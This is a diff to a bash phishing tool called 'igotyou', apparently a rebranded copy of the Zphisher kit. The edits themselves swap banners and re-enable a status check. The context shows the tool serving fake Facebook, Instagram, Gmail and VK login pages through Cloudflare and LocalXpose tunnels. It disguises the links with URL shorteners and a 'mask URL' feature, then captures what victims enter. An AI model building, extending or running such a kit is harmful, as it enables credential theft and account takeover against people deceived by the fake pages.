@@ -173,7 +173,7 @@ check_update(){
 			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
 			rm -f .igotyou.tar.gz
 			popd > /dev/null 2>&1
-			{ sleep 3; clear; banner_small; }
+			{ sleep 3; clear; banner; }
 			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run igotyou again\n\n"${WHITE}
 			{ reset_color ; exit 1; }
 		else
@@ -195,26 +195,15 @@ check_status() {
 ## Banner
 banner() {
 #!/bin/bash
+cat <<- EOF
 
-echo "
-██╗ ██████╗  ██████╗ ████████╗     ██╗  ██╗ ██████╗ ██╗   ██╗
-██║██╔═══██╗██╔════╝ ╚══██╔══╝     ██║  ██║██╔═══██╗██║   ██║
-██║██║   ██║██║  ███╗   ██║        ███████║██║   ██║██║   ██║
-██║██║   ██║██║   ██║   ██║        ██╔══██║██║   ██║██║   ██║
-██║╚██████╔╝╚██████╔╝   ██║        ██║  ██║╚██████╔╝╚██████╔╝
-╚═╝ ╚═════╝  ╚═════╝    ╚═╝        ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ 
-"
-
-
-	cat <<- EOF
-		${ORANGE}
-		${ORANGE}  █████████    ██████  
-		${ORANGE}      █       █
-	 	${ORANGE}      █      █ 
-		${ORANGE}      █       █  █
-		${ORANGE}      █        ██ 
-		${ORANGE}      █
-		${ORANGE}  █████████                                    
+		${ORANGE} ██╗     ██████╗  ██████╗ ████████╗    ██╗   ██╗ ██████╗ ██╗   ██╗
+		${ORANGE} ██║    ██╔════╝ ██╔═══██╗╚══██╔══╝    ╚██╗ ██╔╝██╔═══██╗██║   ██║
+		${ORANGE} ██║    ██║  ███╗██║   ██║   ██║        ╚████╔╝ ██║   ██║██║   ██║
+		${ORANGE} ██║    ██║   ██║██║   ██║   ██║         ╚██╔╝  ██║   ██║██║   ██║
+		${ORANGE} ██║    ╚██████╔╝╚██████╔╝   ██║          ██║   ╚██████╔╝╚██████╔╝
+		${ORANGE} ╚═╝     ╚═════╝  ╚═════╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ 
+				                                                                              
 		${ORANGE}                      ${RED}Version : ${__version__}
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by AnonyHackz (Vijay Veerappa)${WHITE}
@@ -222,14 +211,7 @@ echo "
 }
 
 ## Small Banner
-banner_small() {
-	cat <<- EOF
-		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
-	EOF
-}
+
 
 ## Dependencies
 dependencies() {
@@ -394,7 +376,7 @@ cusport() {
 			echo
 		else
 			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
-			{ sleep 2; clear; banner_small; cusport; }
+			{ sleep 2; clear; banner; cusport; }
 		fi		
 	else 
 		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
@@ -514,14 +496,14 @@ start_localhost() {
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
-	{ sleep 1; clear; banner_small; }
+	{ sleep 1; clear; banner; }
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
 ## Tunnel selection
 tunnel_menu() {
-	{ clear; banner_small; }
+	{ clear; banner; }
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
@@ -547,7 +529,7 @@ tunnel_menu() {
 
 ## Custom Mask URL
 custom_mask() {
-	{ sleep .5; clear; banner_small; echo; }
+	{ sleep .5; clear; banner; echo; }
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
@@ -581,7 +563,7 @@ custom_url() {
 	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
-	{ custom_mask; sleep 1; clear; banner_small; }
+	{ custom_mask; sleep 1; clear; banner; }
 	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
 		if [[ $(site_stat $isgd) == 2* ]]; then
 			shorten $isgd "$url"
@@ -637,7 +619,7 @@ site_facebook() {
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_facebook; };;
+			{ sleep 1; clear; banner; site_facebook; };;
 	esac
 }
 
@@ -673,7 +655,7 @@ site_instagram() {
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_instagram; };;
+			{ sleep 1; clear; banner; site_instagram; };;
 	esac
 }
 
@@ -704,7 +686,7 @@ site_gmail() {
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_gmail; };;
+			{ sleep 1; clear; banner; site_gmail; };;
 	esac
 }
 
@@ -730,7 +712,7 @@ site_vk() {
 			tunnel_menu;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_vk; };;
+			{ sleep 1; clear; banner; site_vk; };;
 	esac
 }
 
@@ -906,7 +888,7 @@ main_menu() {
 ## Main
 kill_pid
 dependencies
-#check_status
+check_status
 install_cloudflared
 install_localxpose
 main_menu
